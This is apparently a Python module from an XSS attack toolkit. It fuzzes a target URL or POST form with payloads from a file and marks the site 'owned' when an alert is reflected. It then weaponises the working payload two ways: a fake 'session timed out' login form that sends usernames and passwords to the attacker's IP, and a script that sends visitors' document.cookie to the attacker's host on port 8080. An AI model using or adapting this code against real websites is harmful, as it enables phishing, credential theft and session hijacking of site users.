try:
    import requests # imports
except ImportError:
    print("Error importing 'request' module")
    exit()
try:
    import os
except ImportError:
    print("Error importing 'os' module")
    exit()
try:
    import urllib
except ImportError:
    print("Error importing 'urllib' module")
    exit()



class xss:
    def __init__(self, web, post):
        self.web = web # web to attack
        self.owned = True # owned?
        self.payload = "" # if payload... here will be
        self.exit=False # exit?
        self.post = post
        self.listener=False
    def attacks(self):
    
        request ="" #initialited
        try:
            file = open("payloads.txt", "r") # xss payloads file
        except FileNotFoundError:
            print("File not found")
            exit()
        except IOError:
            print("IOError")
            exit()
        payloads = file.readlines() # each line of file, to array
        file.close()
        lenght = len(payloads) #lenght 
        
        if self.post is "": 
            for i in range(0, lenght): 
                web2exploit = self.web.replace('&this', payloads[i]) # replace &this for the payload
                headers = {'user-agent': 'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko)     Version/9.0 Mobile/13F69 Safari/601.1'}
                request = requests.get(web2exploit, headers=headers) # request
                print("\033[94m" +  request.url + "\033[0m") # print request in blue


                if "alert('XET')" in request.text: # if alert... is in response, its vuln
                    os.system("clear")
                    self.payload=payloads[i] # save that payload
                    return True # its owned, so return true
                    break 
                else: # if not alert... in response, not vuln   
                   print("[*] Not Vulnerable. . .")
        else:
            param = ""
            data={}
            for i in range(0, lenght): 
                post2exploit = self.post.replace('$this', payloads[i]) # replace &this for the payload
                datas = post2exploit.split('&')
                for element in datas:
                    param = element.split('=')
                    data[param[0]] = param[1]

                headers = {'user-agent': 'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko)     Version/9.0 Mobile/13F69 Safari/601.1'}
                try:
                    request = requests.post(post2exploit, data=data, headers=headers) # request
                except:
                    print("Error in petition, may be bad website?")
                    exit()
                print("\033[94m" +  post2exploit + "\033[0m") # print request in blue


                if "alert('XET')" in request.text: # if alert... is in response, its vuln
                    os.system("clear")
                    self.payload=payloads[i] # save that payload
                    return True # its owned, so return true
                    break 
                else: # if not alert... in response, not vuln   
                   print("[*] Not Vulnerable. . .")     


    def phishing(self):

        if self.post is "":
            phishing = """<div style="position:absolute;top:50%;left:50%;margin: -100px 0 0 -100px;height=100px;width=100px;z-    index:1;border-width:1px;border-style:solid; border-color:#D3D3D3">
       <h3>Your session has timed out.</h3>
       <form action=http://yourip>
        Username:<br><input type="text" name="user"><br>
        Password:<br><input type="password" name="pass"><br><br>
        <input type="submit" value="Logon">
       </form>
        </div>"""
            ip = input("\033[94m" + "xet:phishing> " + "\033[0m" + "Insert Your IP: ")
            phishing = phishing.replace("yourip", ip)
            print(phishing)
            # replace alert for phishing
            phished = self.payload.replace("alert('XET')", phishing)
            self.web.replace("&this", phished)
            listener = input("\033[94m" + "xss:phishing> " + "\033[0m" + "Do you want to start listener now? (Yes/No): ")
            listener.lower()
            if "yes" in listener:
                os.system("clear")
                self.listener = True       
            else:
                print("Use this payload, you can create an html\nportal that send post petition:\n {}".format(phished))
                p = input("\033[94m" + "xss:phishing> "+ "\033[0m" + "Press enter to exit")
        else:
            print("To make a post xss, create an html portal that send petition to the victim¡")
            p = input("\033[94m" + "xss:hijacking> " + "\033[0m"+ "Press enter to exit")
            
    def cookies(self):
        cookie = "image = new Image(); image.src='http://yourip:8080/?'+document.cookie;"
        ip = input("\033[94m" + "xss:hijacking> " + "\033[0m" + "Insert Your IP: ")
        cookie = cookie.replace("yourip", ip)
        cooked = self.payload.replace("alert('XET')", cookie)
        self.web = self.web.replace("&this", cooked)
        listener = input("\033[94m" + "xet:phishing> " + "\033[0m" + "Do you want to start listener now? (Yes/No): ")
        listener = listener.lower() 
        if "yes" in listener:
            os.system("clear")
            self.listener = True       
        else:
           print("\033[94m" + "xss:hijacking> " + "\033[0m"+ "Use this payload, you can create an html\nportal that send post petition:\n {}".format(cooked))     
           p = input("\033[94m" + "xss:hijacking> " + "\033[0m" +  "Press enter to exit")


if __name__ == "__main__":  #have no sense execute this directly, so...
     print("[¡] This is a module¡, use xsstoolkit.py instead")
     exit()
